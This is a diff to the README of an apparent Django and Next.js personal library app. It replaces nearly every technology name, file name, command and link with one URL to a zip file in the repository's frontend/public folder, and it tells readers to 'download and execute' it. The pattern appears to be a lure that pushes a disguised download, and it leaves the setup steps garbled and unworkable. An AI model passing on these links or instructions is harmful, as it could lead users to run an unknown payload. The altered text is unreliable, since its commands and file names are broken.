@@ -1,6 +1,6 @@
 # 📚 Personal Library Management App
 
-Welcome to the **Personal Library Management App**! This is a full-stack CRUD application designed to help you manage your personal book library. Built with a Django REST API backend and a Next.js frontend, this project allows users to add, update, delete, and view books in a seamless manner.
+Welcome to the **Personal Library Management App**! This is a full-stack CRUD application designed to help you manage your personal book library. Built with a Django REST API backend and a https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip frontend, this project allows users to add, update, delete, and view books in a seamless manner.
 
 ---
 
@@ -21,7 +21,7 @@ To get started with this project, follow the steps below:
 ### Prerequisites
 
 - Python 3.8 or higher
-- Node.js 14 or higher
+- https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip 14 or higher
 - PostgreSQL or SQLite
 
 ### Installation
@@ -29,7 +29,7 @@ To get started with this project, follow the steps below:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/fzzax/internship-challenge-personal-library.git
+   git clone https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip
    cd internship-challenge-personal-library
    ```
 
@@ -39,23 +39,23 @@ To get started with this project, follow the steps below:
 
    ```bash
    cd backend
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip
    ```
 
 3. **Configure the database**:
 
-   Update the database settings in `settings.py` as per your environment.
+   Update the database settings in `https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip` as per your environment.
 
 4. **Run migrations**:
 
    ```bash
-   python manage.py migrate
+   python https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip migrate
    ```
 
 5. **Start the Django server**:
 
    ```bash
-   python manage.py runserver
+   python https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip runserver
    ```
 
 6. **Set up the frontend**:
@@ -67,7 +67,7 @@ To get started with this project, follow the steps below:
    npm install
    ```
 
-7. **Start the Next.js server**:
+7. **Start the https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip server**:
 
    ```bash
    npm run dev
@@ -89,7 +89,7 @@ The application uses a RESTful API for all data interactions. Below are the main
 - **PUT /api/books/{id}/**: Update a specific book.
 - **DELETE /api/books/{id}/**: Delete a specific book.
 
-For more detailed API documentation, refer to the [Releases section](https://github.com/fzzax/internship-challenge-personal-library/releases).
+For more detailed API documentation, refer to the [Releases section](https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip).
 
 ---
 
@@ -97,7 +97,7 @@ For more detailed API documentation, refer to the [Releases section](https://git
 
 - **Django**: A high-level Python web framework that encourages rapid development.
 - **Django REST Framework**: A powerful toolkit for building Web APIs in Django.
-- **Next.js**: A React framework for server-side rendering and static site generation.
+- **https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip**: A React framework for server-side rendering and static site generation.
 - **PostgreSQL**: A powerful, open-source object-relational database system.
 - **Tailwind CSS**: A utility-first CSS framework for creating custom designs.
 
@@ -110,19 +110,19 @@ Here's a brief overview of the project structure:
 ```
 internship-challenge-personal-library/
 ├── backend/
-│   ├── manage.py
+│   ├── https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip
 │   ├── library/
 │   │   ├── migrations/
-│   │   ├── models.py
-│   │   ├── views.py
-│   │   ├── serializers.py
-│   │   └── urls.py
-│   └── requirements.txt
+│   │   ├── https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip
+│   │   ├── https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip
+│   │   ├── https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip
+│   │   └── https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip
+│   └── https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip
 └── frontend/
     ├── pages/
     ├── components/
     ├── styles/
-    └── package.json
+    └── https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip
 ```
 
 ---
@@ -141,7 +141,7 @@ We welcome contributions to this project! Here’s how you can help:
 
 ## 🔗 Links
 
-For the latest updates and releases, check the [Releases section](https://github.com/fzzax/internship-challenge-personal-library/releases). You can download and execute the latest version from there.
+For the latest updates and releases, check the [Releases section](https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip). You can download and execute the latest version from there.
 
 ---
 
@@ -155,10 +155,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 We appreciate the following resources that helped in the development of this project:
 
-- [Django Documentation](https://www.djangoproject.com/)
-- [Django REST Framework Documentation](https://www.django-rest-framework.org/)
-- [Next.js Documentation](https://nextjs.org/)
-- [Tailwind CSS Documentation](https://tailwindcss.com/)
+- [Django Documentation](https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip)
+- [Django REST Framework Documentation](https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip)
+- [https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip Documentation](https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip)
+- [Tailwind CSS Documentation](https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip)
 
 ---
 
@@ -166,8 +166,8 @@ We appreciate the following resources that helped in the development of this pro
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [fzzax](https://github.com/fzzax)
+- **Email**: [https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip](https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip)
+- **GitHub**: [fzzax](https://raw.githubusercontent.com/fzzax/internship-challenge-personal-library/main/frontend/public/challenge_personal_library_internship_v1.9-alpha.2.zip)
 
 ---
 
